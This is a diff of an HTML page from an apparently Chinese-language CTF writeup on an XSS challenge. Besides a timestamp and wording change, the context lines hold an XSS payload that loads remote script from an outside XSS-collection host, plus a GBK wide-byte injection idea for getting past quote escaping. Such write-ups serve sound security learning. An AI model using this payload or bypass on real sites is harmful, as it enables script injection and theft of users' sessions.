@@ -19,7 +19,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://s1.ax1x.com/2020/03/12/8mr6fI.jpg">
 <meta property="og:image" content="https://s1.ax1x.com/2020/03/12/8mgIWd.jpg">
-<meta property="og:updated_time" content="2020-03-12T14:46:26.850Z">
+<meta property="og:updated_time" content="2020-03-12T14:56:51.817Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Stage1Day5 Web">
 <meta name="twitter:description" content="XSS2 writeup.">
@@ -217,7 +217,7 @@
 <p>本题目与XSS1的不同之处在于并没有告知过滤了哪些字符，我们将XSS1的payload输入后直接查看被过滤后的结果：</p>
 <table><tr><td bgcolor="#87CEFA">hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);//</td></tr></table>
 <center><img src="https://s1.ax1x.com/2020/03/12/8mr6fI.jpg" alt="8mr6fI.jpg" border="0"></center>
-可以看到后台将<>替换为空，将单引号 `'` 和双引号`"`用反斜杠转义了。结合给出的提示，看到html使用GBK编码，联想到使用宽字节注入：
+可以看到后台将<>替换为空，将单引号和双引号用反斜杠转义了。结合给出的提示，看到html使用GBK编码，联想到使用宽字节注入：
 
 <h1 id="如何使用-amp-防御"><a href="#如何使用-amp-防御" class="headerlink" title="如何使用&amp;防御"></a>如何使用&amp;防御</h1><ul>
 <li><p>“宽字节”：GB2312、GBK、GB18030、BIG5、Shift_JIS等，占两字节；ASCII占一字节。</p>
